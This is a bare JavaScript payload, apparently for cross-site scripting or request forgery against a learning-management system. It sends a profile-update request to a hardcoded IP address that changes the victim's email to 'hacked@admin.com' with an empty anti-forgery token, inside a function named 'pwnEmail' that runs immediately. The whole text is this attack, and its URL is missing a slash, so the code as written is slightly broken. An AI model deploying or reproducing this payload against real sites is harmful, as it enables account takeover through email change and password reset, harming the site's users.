

var params = "r=lms/profile/show&ap=saveinfo&authentic_request=&up_lastname=&up_firstname=&up_email=hacked@admin.com&user_preference[ui.language]=0&up_signature=&save=Save+changes";

function pwnEmail(){

    var xhr = new XMLHttpRequest();
    xhr.open("GET", "http://3.89.57.89" + "index.php?"+params, true);
    xhr.send(null);

}

pwnEmail();
